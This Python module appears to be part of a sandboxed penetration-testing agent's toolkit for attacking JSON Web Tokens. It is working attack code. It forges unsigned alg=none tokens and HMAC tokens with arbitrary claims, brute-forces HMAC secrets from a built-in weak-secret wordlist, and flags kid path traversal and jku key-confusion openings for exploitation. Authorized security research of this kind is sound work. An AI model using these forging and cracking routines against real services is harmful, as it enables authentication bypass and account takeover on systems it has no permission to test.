"""JWT (RFC 7519) parse, forge, and crack helpers.

This is a *research* toolkit, not a production JWT library: correctness
and defensive validation take a back seat to flexibility. The agent
needs to:

1. Parse arbitrary tokens including malformed ones (to see what a
   vulnerable server would accept).
2. Forge tokens with arbitrary header / claim mutations.
3. Exploit the classic alg-confusion vulnerabilities:
   - alg=none
   - HS256 with the RSA public key as the HMAC secret
   - Key-confusion via ``kid``/``jku``/``x5u`` injection
4. Crack HS256 / HS384 / HS512 weak secrets via dictionary attack.

No external crypto dependency: HS* is implemented against ``hmac``,
``base64`` and ``hashlib``. RS*/ES*/PS* verification is out of scope
because those require cryptography-library primitives that would bloat
the sandbox image — the agent can shell out for those.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Any, Iterable

# ── base64url helpers ───────────────────────────────────────────────────


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    # Accept input with or without padding, and with a little slack for
    # bad tokens the agent is probing.
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


# ── Dataclasses ─────────────────────────────────────────────────────────


@dataclass
class JWTHeader:
    """Decoded JWT header. Raw fields preserved so agents can see exactly
    what the server produced."""

    alg: str = "none"
    typ: str = "JWT"
    kid: str | None = None
    jku: str | None = None
    x5u: str | None = None
    extra: dict[str, Any] = field(default_factory=dict)

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> JWTHeader:
        known = {"alg", "typ", "kid", "jku", "x5u"}
        return cls(
            alg=data.get("alg", "none"),
            typ=data.get("typ", "JWT"),
            kid=data.get("kid"),
            jku=data.get("jku"),
            x5u=data.get("x5u"),
            extra={k: v for k, v in data.items() if k not in known},
        )

    def to_dict(self) -> dict[str, Any]:
        out: dict[str, Any] = {"alg": self.alg, "typ": self.typ}
        if self.kid is not None:
            out["kid"] = self.kid
        if self.jku is not None:
            out["jku"] = self.jku
        if self.x5u is not None:
            out["x5u"] = self.x5u
        out.update(self.extra)
        return out


@dataclass
class JWTClaims:
    """Decoded JWT body (RFC 7519 registered claims + raw extras)."""

    iss: str | None = None
    sub: str | None = None
    aud: Any = None
    exp: int | None = None
    nbf: int | None = None
    iat: int | None = None
    jti: str | None = None
    extra: dict[str, Any] = field(default_factory=dict)

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> JWTClaims:
        known = {"iss", "sub", "aud", "exp", "nbf", "iat", "jti"}
        return cls(
            iss=data.get("iss"),
            sub=data.get("sub"),
            aud=data.get("aud"),
            exp=data.get("exp"),
            nbf=data.get("nbf"),
            iat=data.get("iat"),
            jti=data.get("jti"),
            extra={k: v for k, v in data.items() if k not in known},
        )

    def to_dict(self) -> dict[str, Any]:
        out: dict[str, Any] = {}
        for name in ("iss", "sub", "aud", "exp", "nbf", "iat", "jti"):
            val = getattr(self, name)
            if val is not None:
                out[name] = val
        out.update(self.extra)
        return out

    @property
    def expired(self) -> bool:
        return self.exp is not None and self.exp < int(time.time())


@dataclass
class JWTToken:
    """Parsed JWT with raw segments and findings surfaced for the agent."""

    header: JWTHeader
    claims: JWTClaims
    signature: bytes
    raw: str
    findings: list[str] = field(default_factory=list)

    def segments(self) -> tuple[str, str, str]:
        parts = self.raw.split(".")
        if len(parts) != 3:
            return (parts[0] if parts else "", "", "")
        return parts[0], parts[1], parts[2]


# ── Parse ───────────────────────────────────────────────────────────────


def parse_token(token: str) -> JWTToken:
    """Parse a JWT without verifying the signature. Always returns a token
    even if the input is malformed — caller checks ``findings`` for bugs.
    """
    token = token.strip()
    findings: list[str] = []

    parts = token.split(".")
    if len(parts) != 3:
        findings.append(f"malformed: expected 3 segments, got {len(parts)}")
        # Best-effort parse of what we have
        parts = (parts + ["", "", ""])[:3]

    try:
        header_raw = _b64url_decode(parts[0]) if parts[0] else b"{}"
        header_data = json.loads(header_raw.decode("utf-8", errors="replace"))
    except (ValueError, json.JSONDecodeError):
        findings.append("header not valid base64url JSON")
        header_data = {}

    try:
        body_raw = _b64url_decode(parts[1]) if parts[1] else b"{}"
        claim_data = json.loads(body_raw.decode("utf-8", errors="replace"))
    except (ValueError, json.JSONDecodeError):
        findings.append("body not valid base64url JSON")
        claim_data = {}

    try:
        sig = _b64url_decode(parts[2]) if parts[2] else b""
    except ValueError:
        findings.append("signature not valid base64url")
        sig = b""

    header = JWTHeader.from_dict(header_data)
    claims = JWTClaims.from_dict(claim_data)
    tok = JWTToken(header=header, claims=claims, signature=sig, raw=token, findings=findings)

    # High-value header findings
    if header.alg.lower() == "none":
        tok.findings.append("alg=none — server MAY accept unsigned tokens (CVE class)")
    if header.alg.lower() == "hs256" and header.jku:
        tok.findings.append("alg=HS256 with jku header — key confusion candidate")
    if header.kid and ("../" in header.kid or "%2f" in header.kid.lower()):
        tok.findings.append("kid contains path traversal — file read / SQLi candidate")
    if header.jku and not header.jku.startswith("https://"):
        tok.findings.append("jku over non-HTTPS or attacker-controlled host — key confusion")
    if claims.expired:
        tok.findings.append("token already expired — test whether server enforces exp")
    if claims.exp is None:
        tok.findings.append("no exp claim — server MAY accept forever-valid tokens")
    return tok


# ── Signing primitives ─────────────────────────────────────────────────


_HS_ALGS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def _sign_hs(alg: str, key: bytes, msg: bytes) -> bytes:
    if alg not in _HS_ALGS:
        raise ValueError(f"unsupported HMAC alg: {alg}")
    return hmac.new(key, msg, _HS_ALGS[alg]).digest()


def forge_token(
    claims: dict[str, Any] | JWTClaims,
    *,
    alg: str = "none",
    secret: bytes | str | None = None,
    header: dict[str, Any] | JWTHeader | None = None,
) -> str:
    """Construct a JWT with arbitrary claims and signing algorithm.

    Supported ``alg`` values:
    - ``none``        — unsigned; signature segment is empty
    - ``HS256/384/512`` — HMAC with the given ``secret``

    Any other value raises ``ValueError``. For RS*/ES*/PS* the agent
    should shell out to openssl / python-jose from within the sandbox.
    """
    alg = alg.upper()
    if alg != "NONE" and alg not in _HS_ALGS:
        raise ValueError(f"unsupported alg: {alg} — use none/HS256/HS384/HS512")

    if isinstance(header, JWTHeader):
        header_dict = header.to_dict()
    else:
        header_dict = dict(header or {})
    header_dict["alg"] = alg.lower() if alg == "NONE" else alg
    header_dict.setdefault("typ", "JWT")

    body = claims.to_dict() if isinstance(claims, JWTClaims) else dict(claims)

    header_segment = _b64url_encode(
        json.dumps(header_dict, separators=(",", ":"), sort_keys=True).encode("utf-8")
    )
    body_segment = _b64url_encode(
        json.dumps(body, separators=(",", ":"), sort_keys=True).encode("utf-8")
    )
    signing_input = f"{header_segment}.{body_segment}".encode("ascii")

    if alg == "NONE":
        signature = b""
    else:
        if secret is None:
            raise ValueError("secret required for HMAC alg")
        key = secret.encode("utf-8") if isinstance(secret, str) else secret
        signature = _sign_hs(alg, key, signing_input)

    return f"{header_segment}.{body_segment}.{_b64url_encode(signature)}"


def verify_hs(token: JWTToken, secret: bytes | str) -> bool:
    """Verify an HS256/384/512 token against a candidate secret.

    Constant-time comparison via ``hmac.compare_digest``. Returns False
    for any non-HMAC alg so the caller can filter before calling.
    """
    alg = token.header.alg.upper()
    if alg not in _HS_ALGS:
        return False
    key = secret.encode("utf-8") if isinstance(secret, str) else secret
    header_segment, body_segment, _ = token.segments()
    signing_input = f"{header_segment}.{body_segment}".encode("ascii")
    expected = _sign_hs(alg, key, signing_input)
    return hmac.compare_digest(expected, token.signature)


# ── Secret cracker ──────────────────────────────────────────────────────


def crack_hs_secret(token: JWTToken, candidates: Iterable[str]) -> str | None:
    """Dictionary-attack an HS* token. Returns the first matching secret
    or None if none of the candidates work. O(N) in the candidate list.
    """
    if token.header.alg.upper() not in _HS_ALGS:
        return None
    for cand in candidates:
        if verify_hs(token, cand):
            return cand
    return None


# Canonical weak-secret list used by scanners.
DEFAULT_WEAK_SECRETS: tuple[str, ...] = (
    "",
    "secret",
    "password",
    "admin",
    "changeme",
    "token",
    "jwt",
    "key",
    "your-256-bit-secret",
    "mysecret",
    "supersecret",
    "secretkey",
    "default",
    "test",
    "hello",
    "123456",
    "example",
)
